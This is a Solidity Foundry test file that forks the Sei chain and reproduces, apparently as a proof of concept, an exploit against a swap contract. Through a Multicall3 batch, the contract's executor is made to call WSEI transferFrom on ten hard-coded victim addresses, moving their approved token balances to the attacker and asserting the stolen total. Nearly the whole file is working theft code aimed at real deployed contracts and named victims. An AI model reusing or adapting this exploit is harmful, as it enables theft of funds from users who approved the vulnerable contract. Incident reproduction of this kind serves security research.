// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

struct Call3 {
    address target;
    bool allowFailure;
    bytes callData;
}

struct Result {
    bool success;
    bytes returnData;
}

struct SwapParams {
    address srcToken;
    address dstToken;
    uint256 amount;
    address payable executor;
    bytes executeParams;
    bytes extraData;
}

interface IWSEI{
    function balanceOf(address) external returns(uint);
}
interface IMulticall {
    function aggregate3(Call3[] calldata calls) external payable returns (Result[] memory returnData);
}

contract CounterTest is Test {
    address multi = 0xcA11bde05977b3631167028862bE2a173976CA11;
    address wsei = 0xE30feDd158A2e3b13e9badaeABaFc5516e95e8C7;
    function setUp() public {
        vm.createSelectFork("sei",167720275-1);
    }

    function testMulticallAggregate3() public {
        
        address[] memory victims = new address[](10);
        victims[0] = 0x17860B2320A9B43a9B7F4d16fe8e51F4Ccfd92B8;
        victims[1] = 0x3A7348B0e30b0C615ED65B1D9F3f7b960217863a;
        victims[2] = 0x20Ddb3C73982Af3Ccc0fbF38E2640aA575E66ca8;
        victims[3] = 0xBA15B097870D51116B732cE13a278594cbaA5120;
        victims[4] = 0x89adD83aed3dCAEdcfddA730Ff25d8Baf19471B9;
        victims[5] = 0xc2E443BA13A28b2d518e8A6d631f48E2629076CB;
        victims[6] = 0x3fa332824EA18f6400b4713722e9bff815E89Ccc;
        victims[7] = 0x6D0Cc2AD2EEC7044df589523718F14338518CE7a;
        victims[8] = 0x175bdE193D5428f4e4ef517E5E941e85F0e338Ed;
        victims[9] = 0x3fd96fE7295510937C4023eBB4b40cC3CEd7537b;

        uint[] memory amounts = new uint[](10);
        amounts[0] = 1105960373927494381965723;
        amounts[1] = 137044321903366536524472;
        amounts[2] = 25541292807659765844806;
        amounts[3] = 17857411286873928038963;
        amounts[4] = 14166217514776650524659;
        amounts[5] = 13269617716992687771329;
        amounts[6] = 9799767220744557654412;
        amounts[7] = 9774194087788217155931;
        amounts[8] = 8636583233259164982754;
        amounts[9] = 5710106019019251320846;
        Call3[] memory calls = new Call3[](victims.length);

        for(uint i = 0; i < victims.length; i++) {
            calls[i] = Call3({
                target: 0x14bb98581Ac1F1a43fD148db7d7D793308Dc4d80,
                allowFailure: true,
                callData: createCalldata(victims[i], amounts[i])
            });
        }
        IMulticall(multi).aggregate3(calls);
        require(IWSEI(wsei).balanceOf(address(this)) == 1347759885717975141783895);
    }

    function createCalldata(address _victim, uint256 _amount) internal view returns (bytes memory) {
        bytes memory executeParams = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            _victim,
            address(this),
            _amount
        );

        SwapParams memory params = SwapParams({
            srcToken: wsei,
            dstToken: wsei,
            amount: 0,
            executor: payable(wsei),
            executeParams: executeParams,
            extraData: ""
        });

        return abi.encodeWithSignature(
            "swap((address,address,uint256,address,bytes,bytes))",
            params
        );
    }
}

